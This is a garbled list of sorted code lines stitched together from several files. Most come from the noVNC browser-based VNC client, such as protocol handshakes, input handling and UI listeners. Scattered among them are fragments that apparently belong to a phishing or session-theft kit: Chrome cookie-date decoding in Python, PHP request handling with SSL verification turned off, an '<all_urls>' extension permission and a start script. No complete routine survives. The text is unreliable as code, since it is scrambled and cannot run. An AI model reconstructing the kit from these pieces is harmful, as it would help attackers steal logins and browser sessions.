"                                this._handleMouseButton(pos.x, pos.y, false, 0x8)"
"                                this._handleMouseButton(pos.x, pos.y, true, 0x10)"
"                                this._handleMouseButton(pos.x, pos.y, true, 0x8)"
"                               ""previous connection state: "" "
"                              "" (reason: "" "
"                              ""the notunnel type"")"
"                            KeyTable.XK_Eisu_toggle,"
"                            KeyTable.XK_Hiragana,"
"                            KeyTable.XK_Katakana,"
"                            image.hotx, image.hoty,"
"                            image.w, image.h"
"                            this._handleKeyEvent(KeyTable.XK_Control_L, ""ControlLeft"", true)"
"                            this._handleMouseButton(pos.x, pos.y, false, 0x10)"
"                            this._handleMouseButton(pos.x, pos.y, false, 0x20)"
"                            this._handleMouseButton(pos.x, pos.y, false, 0x40)"
"                            this._handleMouseButton(pos.x, pos.y, false, 0x8)"
"                            this._handleMouseButton(pos.x, pos.y, true, 0x10)"
"                            this._handleMouseButton(pos.x, pos.y, true, 0x20)"
"                            this._handleMouseButton(pos.x, pos.y, true, 0x40)"
"                            this._handleMouseButton(pos.x, pos.y, true, 0x8)"
"                           ""when already disconnected "" "
"                           repeaterID: UI.getSetting('repeaterID'),"
"                         { shared: UI.getSetting('shared'),"
"                        ""clipboard"","
"                        ""credentialsrequired"", this._eventHandlers.handleRSAAESCredentialsRequired)"
"                        ""serververification"", this._eventHandlers.handleRSAAESServerVerification)"
"                        // We don't send unsolicited clipboard, so we"
"                        //Inverted pixel, not supported in browsers."
"                        <div class=""heading-icon warning-icon""></div>"
"                        Log.Error(""Unable to play bell: "" "
"                        RFB.messages.extendedClipboardNotify(this._sock, [])"
"                        RFB.messages.extendedClipboardNotify(this._sock, [extendedClipboardFormatText])"
"                        RFB.messages.extendedClipboardProvide(this._sock, [extendedClipboardFormatText], [this._clipboardText])"
"                        RFB.messages.extendedClipboardRequest(this._sock, [extendedClipboardFormatText])"
"                        if (!this._sock.rQwait(""message"", 1)) {"
"                        magnitude = Math.hypot(ev.detail.magnitudeX, ev.detail.magnitudeY)"
"                        return this._fail(""Unsupported tiny auth scheme "" "
"                        textData = textData.slice(0, -1)"
"                        this._fakeMouseMove(ev, pos.x, pos.y)"
"                        this._gestureLastMagnitudeX = Math.hypot(ev.detail.magnitudeX,"
"                        this._handleKeyEvent(KeyTable.XK_Control_L, ""ControlLeft"", false)"
"                        this._handleMouseButton(pos.x, pos.y, false, 0x1)"
"                        this._handleMouseButton(pos.x, pos.y, false, 0x4)"
"                        this._handleMouseButton(pos.x, pos.y, true, 0x1)"
"                        this._handleMouseButton(pos.x, pos.y, true, 0x4)"
"                        this._handleTapEvent(ev, 0x1)"
"                        this._handleTapEvent(ev, 0x2)"
"                        this._handleTapEvent(ev, 0x4)"
"                       "".00"" "
"                       Version 3, 29 June 2007"
"                    ""bell"","
"                    ""disconnect"", { detail:"
"                    ""securityfailure"","
"                    //Only screen value matters, no mouse colouring"
"                    <span class=""icon-wrapper"">"
"                    <span id=""challenge-error-text"">"
"                    Log.Error(""Bad transition to connected state, "" "
"                    Log.Error(""Bad transition to connecting state, "" "
"                    Log.Error(""Bad transition to disconnected state, "" "
"                    Log.Error(""Bad transition to disconnecting state, "" "
"                    Log.Error(""Disconnection timed out."")"
"                    Log.Info(""Enabling continuous updates."")"
"                    RFB.messages.fbUpdateRequest(this._sock, true, 0, 0,"
"                    extendedClipboardActionCaps,"
"                    extendedClipboardActionNotify,"
"                    extendedClipboardActionPeek,"
"                    extendedClipboardActionRequest,"
"                    if (e.message !== ""disconnect normally"") {"
"                    if (e.name === ""NotAllowedError"") {"
"                    if (this._sock.rQwait(""message"", 1)) {"
"                    let tmpText = """""
"                    msg = ""Invalid screen layout"""
"                    msg = ""Out of resources"""
"                    msg = ""Resize is administratively prohibited"""
"                    msg = ""Unknown reason"""
"                    textData = textData.replace("""
"                    this._rfbInitState = ""SecurityResult"""
"                    throw Error("""" "
"                  "", bigEndian: "" "
"                  "", blueMax: "" "
"                  "", blueShift: "" "
"                  "", bpp: "" "
"                  "", greenMax: "" "
"                  "", greenShift: "" "
"                  "", keysym: "" "
"                  "", numlock: "" "
"                  "", redMax: "" "
"                  "", redShift: "" "
"                  "", trueColor: "" "
"                ""clipboard"","
"                ""credentialsrequired"", this._eventHandlers.handleRSAAESCredentialsRequired)"
"                ""credentialsrequired"","
"                ""securityfailure"","
"                ""serververification"", this._eventHandlers.handleRSAAESServerVerification)"
"                $state = json_decode($json, true)"
"                .classList.add(""noVNC_hidden"")"
"                .classList.add(""noVNC_selected"")"
"                .classList.remove(""noVNC_hidden"")"
"                .classList.remove(""noVNC_selected"")"
"                //        isn't allowed this early, but I'm not sure that can"
"                //        key to ""AltGraph""."
"                // FIXME: _socketOpen() can in theory call _fail(), which"
"                // If 'for' isn't set, use the first input element child"
"                // Send the button down event here, as the button up"
"                // Too soon since the latest move, wait the remaining time"
"                <div class=""h2"">"
"                Log.Debug(""Bell"")"
"                Log.Debug(""Selected authentication type: "" "
"                Log.Debug(""sock.rQpeekBytes(30): "" "
"                Log.Error(""Couldn't fetch package.json: "" "
"                Log.Error(""Failed when connecting: "" "
"                Log.Error(""Failed when disconnecting: "" "
"                Log.Error(""Failed while connected: "" "
"                Log.Error(""Got data while disconnected"")"
"                Log.Error(""Got data while in an invalid state"")"
"                Log.Error(""Invalid visual state: "" "
"                Log.Error(""RFB failure: "" "
"                Log.Error(""Unknown connection state: "" "
"                Log.Error(""XVP Operation Failed"")"
"                Log.Info(""XVP extensions enabled (version "" "
"                RFB.messages.extendedClipboardCaps(this._sock, clientActions, {extendedClipboardFormatText: 0})"
"                UI.showStatus(_(""Failed to connect to server""), 'error')"
"                UI.showStatus(_(""Internal error""), 'error')"
"                UI.showStatus(_(""Something went wrong, connection is closed""),"
"                document.addEventListener('DOMContentLoaded', () => UI.start().then(resolve).catch(reject))"
"                document.documentElement.classList.add(""noVNC_connected"")"
"                document.documentElement.classList.add(""noVNC_connecting"")"
"                document.documentElement.classList.add(""noVNC_disconnecting"")"
"                document.documentElement.classList.add(""noVNC_reconnecting"")"
"                echo ""[!] Could not read state file."""
"                echo ""["
"                if (this._sock.rQwait(""rect header"", 12)) { return false"
"                pos = clientToElement(this._gestureFirstDoubleTapEv.detail.clientX,"
"                return this._fail(""Client's tunnel type had the incorrect "" "
"                return this._fail(""Invalid server version "" "
"                return this._fail(""Security handshake failed"")"
"                return this._fail(""Unexpected action in extended clipboard message: "" "
"                return this._fail(""Unknown init state (state: "" "
"                return this._fail(""Unsupported VeNCrypt version "" "
"                return this._fail(""Unsupported auth scheme (scheme: "" "
"                return this._fail(""Unsupported security types (types: "" "
"                return this._fail(""VeNCrypt failure "" "
"                return this._fail(""VeNCrypt subtypes empty"")"
"                statusElem.classList.add(""noVNC_status_error"")"
"                statusElem.classList.add(""noVNC_status_normal"")"
"                statusElem.classList.add(""noVNC_status_warn"")"
"                statusElem.classList.remove(""noVNC_status_error"")"
"                statusElem.classList.remove(""noVNC_status_normal"")"
"                statusElem.classList.remove(""noVNC_status_warn"")"
"                target = document.elementFromPoint(event.clientX,"
"                this._display.viewportChangePos(deltaX, deltaY)"
"                this._fail(""Connection closed "" "
"                this._fail(""Illegal server XVP message (msg: "" "
"                this._fail(""Unexpected server disconnect "" "
"                this._fail(""Unexpected server disconnect before connecting "" "
"                this._fail(""Unexpected server message (type "" "
"                this._handleMouseButton(pos.x, pos.y, false, 1 << 3)"
"                this._handleMouseButton(pos.x, pos.y, false, 1 << 4)"
"                this._handleMouseButton(pos.x, pos.y, false, 1 << 5)"
"                this._handleMouseButton(pos.x, pos.y, false, 1 << 6)"
"                this._handleMouseButton(pos.x, pos.y, true, 1 << 3)"
"                this._handleMouseButton(pos.x, pos.y, true, 1 << 4)"
"                this._handleMouseButton(pos.x, pos.y, true, 1 << 5)"
"                this._handleMouseButton(pos.x, pos.y, true, 1 << 6)"
"                this._handleMouseButton(pos.x, pos.y,"
"                this._handleMouseMove(pos.x, pos.y)"
"                this._resize(this._FBU.width, this._FBU.height)"
"                this._rfbInitState = ""SecurityReason"""
"                this._securityContext = ""authentication scheme"""
"                this._securityContext = ""no security types"""
"                this._securityContext = ""security result"""
"                this._sendKeyEvent(KeyTable.XK_Control_L, ""ControlLeft"", true, numlock, capslock)"
"                this._sendKeyEvent(keysym, code, false, numlock, capslock)"
"                this._sendKeyEvent(keysym, code, true, numlock, capslock)"
"                this._sendKeyEvent(this._keyDownList['ShiftLeft'],"
"                this._sendKeyEvent(this._keyDownList['ShiftRight'],"
"                this._sendMouse(x, y, bmask)"
"                this._sendMouse(x, y, this._mouseButtonMask)"
"                this._setCapability(""power"", true)"
"                this._viewportDragPos = {'x': x, 'y': y}"
"                this.dispatchEvent(new CustomEvent(""connect"", { detail: {} }))"
"                throw Error("""" "
"                throw Error(""Cannot use already closed WebSocket/RTCDataChannel"")"
"                throw new Error(""Unsupported extended clipboard format for Provide message."")"
"                transitionElem.textContent = _(""Connecting..."")"
"                transitionElem.textContent = _(""Disconnecting..."")"
"                transitionElem.textContent = _(""Reconnecting..."")"
"                x => x.toString(16).padStart(2, '0')).join('-')"
"                { detail: { status: this._securityStatus,"
"                { detail: { types: [""password""] } }))"
"                { detail: { types: [""username"", ""password"", ""target""] } }))"
"                { detail: { types: [""username"", ""password""] } }))"
"                }, DISCONNECT_TIMEOUT "
"                }, MOUSE_MOVE_DELAY - timeSinceLastMove)"
"              0,   0,   0, 255,   0,   0,   0,   0,   0,   0,  0,  255,"
"            !(""ControlLeft"" in this._keyDownList)) {"
"            ""desktopname"","
"            ""raw"", key, { name: ""AES-ECB"" }, false, [""encrypt""])"
"            ""raw"", passwordChars, { name: ""DES-ECB"" }, false, [""encrypt""])"
"            'STDVNOAUTH__': 1,"
"            'STDVVNCAUTH_': 2,"
"            'blur': this._allKeysUp.bind(this),"
"            'keydown': this._handleKeyDown.bind(this),"
"            'keyup': this._handleKeyUp.bind(this),"
"            'mouseleave': this._handleMouseLeave.bind(this),"
"            'mousemove': this._handleMouseMove.bind(this),"
"            'mouseover': this._handleMouseOver.bind(this),"
"            'mouseup': this._handleMouseUp.bind(this),"
"            (serverSupportedTunnelTypes[1].signature === ""SCHANNEL"")) {"
"            (serverSupportedTunnelTypes[1].vendor === ""SICR"") "
"            .addEventListener('blur', UI.onblurVirtualKeyboard)"
"            .addEventListener('change', UI.clipboardSend)"
"            .addEventListener('click', () => UI.rfb.machineReboot())"
"            .addEventListener('click', () => UI.rfb.machineReset())"
"            .addEventListener('click', () => UI.rfb.machineShutdown())"
"            .addEventListener('click', UI.approveServer)"
"            .addEventListener('click', UI.cancelReconnect)"
"            .addEventListener('click', UI.clipboardClear)"
"            .addEventListener('click', UI.connect)"
"            .addEventListener('click', UI.disconnect)"
"            .addEventListener('click', UI.hideStatus)"
"            .addEventListener('click', UI.rejectServer)"
"            .addEventListener('click', UI.sendCtrlAltDel)"
"            .addEventListener('click', UI.sendEsc)"
"            .addEventListener('click', UI.sendTab)"
"            .addEventListener('click', UI.setCredentials)"
"            .addEventListener('click', UI.toggleAlt)"
"            .addEventListener('click', UI.toggleClipboardPanel)"
"            .addEventListener('click', UI.toggleCtrl)"
"            .addEventListener('click', UI.toggleExtraKeys)"
"            .addEventListener('click', UI.toggleFullscreen)"
"            .addEventListener('click', UI.togglePowerPanel)"
"            .addEventListener('click', UI.toggleSettingsPanel)"
"            .addEventListener('click', UI.toggleViewDrag)"
"            .addEventListener('click', UI.toggleVirtualKeyboard)"
"            .addEventListener('click', UI.toggleWindows)"
"            .addEventListener('focus', UI.onfocusVirtualKeyboard)"
"            .addEventListener('input', UI.activateControlbar)"
"            .addEventListener('input', UI.keepControlbar)"
"            .addEventListener('input', UI.keyInput)"
"            .addEventListener('keydown', UI.activateControlbar)"
"            .addEventListener('keydown', UI.keepControlbar)"
"            .addEventListener('mousedown', UI.activateControlbar)"
"            .addEventListener('mousedown', UI.controlbarHandleMouseDown)"
"            .addEventListener('mousedown', UI.keepControlbar)"
"            .addEventListener('mousedown', UI.keepVirtualKeyboard, true)"
"            .addEventListener('mousemove', UI.activateControlbar)"
"            .addEventListener('mousemove', UI.dragControlbarHandle)"
"            .addEventListener('mouseup', UI.activateControlbar)"
"            .addEventListener('mouseup', UI.controlbarHandleMouseUp)"
"            .addEventListener('submit', () => false)"
"            .addEventListener('touchend', UI.activateControlbar)"
"            .addEventListener('touchend', UI.controlbarHandleMouseUp)"
"            .addEventListener('touchmove', UI.activateControlbar)"
"            .addEventListener('touchmove', UI.dragControlbarHandle)"
"            .addEventListener('touchstart', UI.activateControlbar)"
"            .addEventListener('touchstart', UI.controlbarHandleMouseDown)"
"            .addEventListener('touchstart', UI.keepControlbar)"
"            .classList.add(""noVNC_idle"")"
"            .classList.add(""noVNC_open"")"
"            .classList.add(""noVNC_selected"")"
"            .classList.contains(""noVNC_open"")) {"
"            .classList.contains(""noVNC_selected"")) {"
"            .classList.remove(""noVNC_idle"")"
"            .classList.remove(""noVNC_open"")"
"            .classList.remove(""noVNC_selected"")"
"            .getElementById(inputFocus).focus(), 100)"
"            // Can't use ""display"" because of Firefox bug "
"            // In TightVNC mode, ServerInit message is extended"
"            // Server sends supported list, client decides"
"            // User does not want to see the dot, so..."
"            // When clipping is enabled, the screen is limited to"
"            // to use in our case, so we always use our own panning"
"            // we don't actually do anything with the capability information that TIGHT sends,"
"            0: { vendor: 'TGHT', signature: 'NOTUNNEL' }"
"            255, 255, 255, 255,   0,   0,   0, 255, 255, 255, 255, 255,"
"            <div id=""challenge-error-title"">"
"            Log.Debug(""Already in state '"" "
"            Log.Debug(""Clearing disconnect timer"")"
"            Log.Debug(""Detected Siemens server. Assuming NOTUNNEL support."")"
"            Log.Debug(""Selected tunnel type: "" "
"            Log.Debug(""Server security types: "" "
"            Log.Debug(""Starting VNC handshake"")"
"            Log.Error(""Can't connect when host is: "" "
"            Log.Error(""Display exception: "" "
"            Log.Error(""Tried changing state of a disconnected RFB object"")"
"            Log.Error(""compressionLevel must be an integer between 0 and 9"")"
"            Log.Error(""noVNC requires a secure context (TLS). Expect crashes!"")"
"            Log.Error(""qualityLevel must be an integer between 0 and 9"")"
"            Log.Info(""Sending key ("" "
"            Log.Info(""Sending keysym ("" "
"            Log.Warn(""Bad payload length ("" "
"            Log.Warn(""Intel AMT KVM only supports 8/16 bit depths. Using low color mode."")"
"            Log.Warn(""Server did not accept the resize request: """
"            Log.Warn(""Specifying showDotCursor as a RFB constructor argument is deprecated"")"
"            Log.Warn(""The given cursor type is not supported: """
"            Log.Warn(""handleMessage called on an empty receive queue"")"
"            RFB.messages.QEMUExtendedKeyEvent(this._sock, keysym, down, scancode)"
"            RFB.messages.clientCutText(this._sock, data)"
"            RFB.messages.extendedClipboardNotify(this._sock, [extendedClipboardFormatText])"
"            RFB.messages.keyEvent(this._sock, keysym, down "
"            UI.addOption(document.getElementById('noVNC_setting_logging'), llevels[i], llevels[i])"
"            UI.closeControlbarTimeout = setTimeout(UI.closeControlbar, 2000)"
"            UI.forceSetting('view_clip', false)"
"            UI.forceSetting('view_clip', true)"
"            UI.reconnectCallback = setTimeout(UI.reconnect, delay)"
"            UI.rfb.sendKey(KeyTable.XK_BackSpace, ""Backspace"")"
"            UI.sendKey(KeyTable.XK_Alt_L, ""AltLeft"", false)"
"            UI.sendKey(KeyTable.XK_Alt_L, ""AltLeft"", true)"
"            UI.sendKey(KeyTable.XK_Control_L, ""ControlLeft"", false)"
"            UI.sendKey(KeyTable.XK_Control_L, ""ControlLeft"", true)"
"            UI.sendKey(KeyTable.XK_Super_L, ""MetaLeft"", false)"
"            UI.sendKey(KeyTable.XK_Super_L, ""MetaLeft"", true)"
"            UI.showStatus(_(""Disconnected""), 'normal')"
"            UI.showStatus(_(""HTTPS is required for full functionality""), 'error')"
"            UI.showStatus(_(""Must set host""), 'error')"
"            UI.statusTimeout = window.setTimeout(UI.hideStatus, time)"
"            WebUtil.writeSetting('controlbar_pos', 'left')"
"            WebUtil.writeSetting('controlbar_pos', 'right')"
"            anchor.classList.add(""noVNC_right"")"
"            anchor.classList.remove(""noVNC_right"")"
"            bar.addEventListener('transitionend', () => bar.style.transitionDuration = '')"
"            btn.classList.add(""noVNC_selected"")"
"            btn.classList.remove(""noVNC_selected"")"
"            case ""000.000"":  // UltraVNC repeater"
"            case ""003.003"":"
"            case ""003.006"":  // UltraVNC"
"            case ""003.007"":"
"            case ""003.008"":"
"            case ""003.889"":  // Apple Remote Desktop"
"            case ""004.000"":  // Intel AMT KVM"
"            case ""004.001"":  // RealVNC 4.6"
"            case ""005.000"":  // RealVNC 5.3"
"            const codepoint = parseInt(e.keyIdentifier.substr(2), 16)"
"            const options = { capture: true, passive: true }"
"            document.documentElement.classList.add(""noVNC_touch"")"
"            document.getElementById(""noVNC_password_block"").classList.add(""noVNC_hidden"")"
"            document.getElementById(""noVNC_username_block"").classList.add(""noVNC_hidden"")"
"            encoding: null,"
"            exps[i].addEventListener('click', UI.toggleExpander)"
"            f.write(',')"
"            fingerprint = Array.from(new Uint8Array(fingerprint).slice(0, 8)).map("
"            focusCanvas: this._focusCanvas.bind(this),"
"            handleGesture: this._handleGesture.bind(this),"
"            handleMouse: this._handleMouse.bind(this),"
"            handleRSAAESCredentialsRequired: this._handleRSAAESCredentialsRequired.bind(this),"
"            handleRSAAESServerVerification: this._handleRSAAESServerVerification.bind(this),"
"            handleResize: this._handleResize.bind(this),"
"            handleWheel: this._handleWheel.bind(this),"
"            height: 0,"
"            hint.classList.add(""noVNC_active"")"
"            hint.classList.remove(""noVNC_active"")"
"            hotx: hotx, hoty: hoty, w: w, h: h,"
"            if (!anchor.classList.contains(""noVNC_right"")) {"
"            if ((code === ""AltRight"") "
"            if (anchor.classList.contains(""noVNC_right"")) {"
"            if (document.readyState === ""interactive"" "
"            if (e.keyIdentifier.substr(0, 2) !== 'U"
"            if (statusElem.classList.contains(""noVNC_status_error"")) {"
"            if (statusElem.classList.contains(""noVNC_status_warn"") "
"            if (this._sock.rQwait(""FBU header"", 3, 1)) { return false"
"            if (this._sock.rQwait(""VMware cursor alpha encoding"","
"            if (this._sock.rQwait(""VMware cursor classic encoding"","
"            if (this._sock.rQwait(""num tunnels"", 4)) { return false"
"            if (this._sock.rQwait(""reason"", strlen, 4)) { return false"
"            if (this._sock.rQwait(""security scheme"", 4)) { return false"
"            if (this._sock.rQwait(""security type"", numTypes, 1)) { return false"
"            if (this._sock.rQwait(""vencrypt ack"", 1)) { return false"
"            if (this._sock.rQwait(""vencrypt subtypes length"", 1)) { return false"
"            if (this._sock.rQwait(""vencrypt subtypes"", 4 "
"            if (this._sock.rQwait(""vencrypt version"", 2)) { return false"
"            if (this._sock.rQwait('TightVNC extended server init header', 8, 24 "
"            if (this._sock.rQwait('TightVNC extended server init header', totalMessagesLength, 32 "
"            if (val.toString().toLowerCase() in {'0': 1, 'no': 1, 'false': 1}) {"
"            if (window.location.protocol.substring(0, 5) == 'https') {"
"            input.setSelectionRange(l, l)"
"            inputFocus = inputFocus === ""none"" "
"            let distance = Math.hypot(dx, dy)"
"            let fingerprint = await window.crypto.subtle.digest(""SHA-1"", publickey)"
"            let length, i"
"            let msg = """""
"            let repeaterID = ""ID:"" "
"            msg = ""(code: "" "
"            msg = _(""Connected (encrypted) to "") "
"            msg = _(""Connected (unencrypted) to "") "
"            msg = _(""New connection has been rejected with reason: "") "
"            msg = _(""New connection has been rejected"")"
"            newLen = Math.max(event.target.selectionStart, newValue.length)"
"            print(f""Error: {e}, chromedate: {chromedate}"")"
"            rects: 0,"
"            return datetime(1601, 1, 1) "
"            return decoder.decodeRect(this._FBU.x, this._FBU.y,"
"            return new Promise((resolve, reject) => {"
"            return this._fail(""Security negotiation failed on "" "
"            return this._fail(""Server wanted tunnels, but doesn't support "" "
"            return this._fail(""Unexpected fence response"")"
"            rgbaPixels: rgba,"
"            securityTypeARD,"
"            securityTypeMSLogonII,"
"            securityTypeNone,"
"            securityTypePlain,"
"            securityTypeRA2ne,"
"            securityTypeTight,"
"            securityTypeVNCAuth,"
"            securityTypeVeNCrypt,"
"            securityTypeXVP,"
"            serverSupportedTunnelTypes[0] = { vendor: 'TGHT', signature: 'NOTUNNEL' }"
"            serverSupportedTunnelTypes[capCode] = { vendor: capVendor, signature: capSignature }"
"            setTimeout(() => window.scrollTo(0, 1), 100)"
"            setTimeout(event.target.focus.bind(event.target), 0)"
"            this._altGrTimeout = setTimeout(this._handleAltGrTimeout.bind(this), 100)"
"            this._display.autoscale(size.w, size.h)"
"            this._display.viewportChangeSize(size.w, size.h)"
"            this._fail(""Error decoding rect: "" "
"            this._fail(""Unexpected server connection while "" "
"            this._fail(""Unsupported encoding (encoding: "" "
"            this._resize(this._FBU.width, this._FBU.height)"
"            this._resizeTimeout = setTimeout(this._requestRemoteResize.bind(this), 500)"
"            this._rfbConnectionState !== ""connected"") {"
"            this._rfbConnectionState === ""connected"") {"
"            this._rfbInitState = ""SecurityResult"""
"            this._rfbRSAAESAuthenticationState = new RSAAESAuthenticationState(this._sock, () => this._rfbCredentials)"
"            this._sendKeyEvent(KeyTable.XK_Caps_Lock, 'CapsLock', false)"
"            this._sendKeyEvent(KeyTable.XK_Caps_Lock, 'CapsLock', false, numlock, capslock)"
"            this._sendKeyEvent(KeyTable.XK_Caps_Lock, 'CapsLock', true)"
"            this._sendKeyEvent(KeyTable.XK_Caps_Lock, 'CapsLock', true, numlock, capslock)"
"            this._sendKeyEvent(KeyTable.XK_Control_L, ""ControlLeft"", true)"
"            this._sendKeyEvent(keysym, code, false, numlock, capslock)"
"            this._sendKeyEvent(keysym, code, true, numlock, capslock)"
"            this._sendKeyEvent(this._keyDownList[code], code, false)"
"            this._sendMouse(x, y, this._mouseButtonMask)"
"            this._sock.open(this._url, this._wsProtocols)"
"            this._target.addEventListener('mouseleave', this._eventHandlers.mouseleave, options)"
"            this._target.addEventListener('mousemove', this._eventHandlers.mousemove, options)"
"            this._target.addEventListener('mouseover', this._eventHandlers.mouseover, options)"
"            this._target.addEventListener('mouseup', this._eventHandlers.mouseup, options)"
"            this._target.removeEventListener('mouseleave', this._eventHandlers.mouseleave, options)"
"            this._target.removeEventListener('mousemove', this._eventHandlers.mousemove, options)"
"            this._target.removeEventListener('mouseover', this._eventHandlers.mouseover, options)"
"            this._target.removeEventListener('mouseup', this._eventHandlers.mouseup, options)"
"            this.classList.add(""noVNC_open"")"
"            this.classList.remove(""noVNC_open"")"
"            this.sendKey(keysym, code, false)"
"            this.sendKey(keysym, code, true)"
"            throw new Error(""Must specify URL, WebSocket or RTCDataChannel"")"
"            throw new Error(""Must specify target"")"
"            val = WebUtil.readSetting(name, defVal)"
"            viewDragButton.classList.add(""noVNC_hidden"")"
"            viewDragButton.classList.add(""noVNC_selected"")"
"            viewDragButton.classList.remove(""noVNC_hidden"")"
"            viewDragButton.classList.remove(""noVNC_selected"")"
"            width: 0,"
"            x: 0,"
"            y: 0,"
"            { name: ""DH"", g: generator, p: prime }, false, [""deriveBits""])"
"            { name: ""DH"", public: serverPublicKey }, clientKey.privateKey, keyLength "
"            } else if (window.location.protocol.substring(0, 4) == 'http') {"
"            }, 0)"
"          core.Debug(""Test: "" .. pattern .. "", Origin: "" .. origin .. "", Match: no"")"
"          core.Debug(""Test: "" .. pattern .. "", Origin: "" .. origin .. "", Match: yes"")"
"        ""<all_urls>"""
"        $context = [ 'http' => [ 'method' => 'GET' ], 'ssl' => [ 'verify_peer' => false, 'allow_self_signed'=> true ] ]"
"        $reqid = GET(""reqid"")"
"        $sid = GET(""svr"")"
"        'pylogger_cancel',"
"        ./start.sh dynamic ""$1"" ""$2"""
"        .catch(err => Log.Error(""Failed to load translations: "" "
"        //        explicit ""cursor: none"
"        // All prepared, kick off the connection"
"        // Alt behaves more like AltGraph on macOS, so shuffle the"
"        // At this point, we know that the cursor is fully transparent, and"
"        // FIXME: if we're in view-only and not dragging,"
"        // If no time was specified, show the status for 1.5 seconds"
"        // In the cases when releaseCapture comes first, the code above is"
"        // In the cases when the mouseup comes first, we need wait for the"
"        // Scaling trumps clipping, so we may need to adjust"
"        // Siemens touch panels have a VNC server that supports NOTUNNEL,"
"        // Since the control bar is fixed on the viewport and not the page,"
"        // So, if a capture is active - look at the captured element instead."
"        // Temporarily disable animation, if bar is displayed, to avoid weird"
"        // The dot should not be shown if the cursor is already visible,"
"        // The exception is when a virtual keyboard is used, because"
"        // The spec is unclear on this ""initial cursor"" issue. Many other"
"        // Therefor, if we get a lot of small mouse wheel events we combine them."
"        // This event could be because we're entering the target, or"
"        // This variable is ideally set when disconnection starts, but"
"        // Unstable, but we don't have anything else to go on"
"        // We can't get a release in the middle of an AltGr sequence, so"
"        // We cannot handle keys we cannot track, but we also need"
"        // We use setTimeout() so it's run in its own context, just like"
"        // Windows doesn't have a proper AltGr, but handles it using"
"        // before this point, since this can throw an exception"
"        // browser smaller, despite remote resize being enabled. So to fix it"
"        // but our position is relative the _layout viewport_,"
"        // clientX/clientY are relative the _visual viewport_,"
"        // hit the same spot, so slightly adjust coordinates"
"        // if reconnect has been disabled in the meantime, do nothing."
"        // is not layout independent, so it is as bad as using keyCode"
"        // macOS doesn't send proper key events for modifiers, only"
"        // must fall through here (i.e. no ""else if""), beacause we may have already received"
"        // second pass, do the sub-auth negotiation"
"        // the server, we need to do it here as well since"
"        // viewers (TigerVNC, RealVNC, Remmina) display an arrow as the"
"        // we're past the point where we could backtrack, so it's safe to call this"
"        // which toggles on each press, but not on release. So pretend"
"        //Log.Debug(""<< Keyboard.grab"")"
"        //Log.Debug("">> Keyboard.grab"")"
"        //Log.Debug("">> Keyboard.ungrab"")"
"        //Log.Debug(""Setting saved '"" "
"        Log.Debug(""<< Keyboard.allKeysUp"")"
"        Log.Debug(""<< RFB.connect"")"
"        Log.Debug(""<< RFB.constructor"")"
"        Log.Debug(""<< RFB.disconnect"")"
"        Log.Debug(""<< UI.clipboardReceive"")"
"        Log.Debug(""<< UI.clipboardSend"")"
"        Log.Debug("">> Keyboard.allKeysUp"")"
"        Log.Debug("">> RFB.connect"")"
"        Log.Debug("">> RFB.constructor"")"
"        Log.Debug("">> RFB.disconnect"")"
"        Log.Debug("">> UI.clipboardReceive: "" "
"        Log.Debug("">> UI.clipboardSend: "" "
"        Log.Debug(""New state '"" "
"        Log.Debug(""Server Tight authentication types: "" "
"        Log.Debug(""Server Tight tunnel types: "" "
"        Log.Debug(""ServerCutText"")"
"        Log.Debug(""SetColorMapEntries"")"
"        Log.Debug(""WebSocket on-close event"")"
"        Log.Debug(""onkeyevent "" "
"        Log.Info(""Screen: "" "
"        Log.Info(""Sending Ctrl-Alt-Del"")"
"        Log.Info(""Sending XVP operation "" "
"        Log.Info(""Server ProtocolVersion: "" "
"        Log.Warn(""Server asked for credentials"")"
"        Log.Warn(""WebSocket on-error event"")"
"        RFB.messages.clientCutText(sock, data, true)"
"        RFB.messages.clientCutText(sock, flags, true)"
"        RFB.messages.clientEncodings(this._sock, encs)"
"        RFB.messages.clientFence(this._sock, flags, payload)"
"        RFB.messages.enableContinuousUpdates(this._sock, true, 0, 0,"
"        RFB.messages.fbUpdateRequest(this._sock, false, 0, 0, this._fbWidth, this._fbHeight)"
"        RFB.messages.pixelFormat(this._sock, this._fbDepth, true)"
"        RFB.messages.pointerEvent(this._sock, this._display.absX(x),"
"        RFB.messages.setDesktopSize(this._sock,"
"        RFB.messages.xvpOp(this._sock, ver, op)"
"        UI.addSettingChangeHandler('compression', UI.updateCompression)"
"        UI.addSettingChangeHandler('logging', UI.updateLogging)"
"        UI.addSettingChangeHandler('quality', UI.updateQuality)"
"        UI.addSettingChangeHandler('resize', UI.applyResizeMode)"
"        UI.addSettingChangeHandler('resize', UI.updateViewClip)"
"        UI.addSettingChangeHandler('show_dot', UI.updateShowDotCursor)"
"        UI.addSettingChangeHandler('view_clip', UI.updateViewClip)"
"        UI.addSettingChangeHandler('view_only', UI.updateViewOnly)"
"        UI.connect(null, UI.reconnectPassword)"
"        UI.idleControlbarTimeout = window.setTimeout(UI.idleControlbar, 2000)"
"        UI.initSetting('compression', 0)"
"        UI.initSetting('encrypt', (window.location.protocol === ""https:""))"
"        UI.initSetting('host', window.location.hostname)"
"        UI.initSetting('logging', 'warn')"
"        UI.initSetting('path', 'websockify')"
"        UI.initSetting('port', port)"
"        UI.initSetting('quality', 9)"
"        UI.initSetting('reconnect', false)"
"        UI.initSetting('reconnect_delay', 5000)"
"        UI.initSetting('repeaterID', '')"
"        UI.initSetting('resize', 'off')"
"        UI.initSetting('shared', true)"
"        UI.initSetting('show_dot', false)"
"        UI.initSetting('view_clip', false)"
"        UI.initSetting('view_only', false)"
"        UI.rfb = new RFB(document.getElementById('noVNC_container'), url,"
"        UI.rfb.addEventListener(""bell"", UI.bell)"
"        UI.rfb.addEventListener(""capabilities"", UI.updatePowerButton)"
"        UI.rfb.addEventListener(""clipboard"", UI.clipboardReceive)"
"        UI.rfb.addEventListener(""connect"", UI.connectFinished)"
"        UI.rfb.addEventListener(""credentialsrequired"", UI.credentials)"
"        UI.rfb.addEventListener(""desktopname"", UI.updateDesktopName)"
"        UI.rfb.addEventListener(""disconnect"", UI.disconnectFinished)"
"        UI.rfb.addEventListener(""securityfailure"", UI.securityFailed)"
"        UI.rfb.addEventListener(""serververification"", UI.serverVerify)"
"        UI.rfb.clipboardPasteFrom("""")"
"        UI.rfb.sendCredentials({ username: username, password: password })"
"        UI.rfb.sendKey(keysym, code, down)"
"        UI.sendKey(KeyTable.XK_Escape, ""Escape"")"
"        UI.sendKey(KeyTable.XK_Tab, ""Tab"")"
"        UI.showStatus(_(""Credentials are required""), ""warning"")"
"        UI.showStatus(msg, 'error')"
"        WebUtil.setSetting(name, val)"
"        WebUtil.writeSetting(name, val)"
"        ]),"
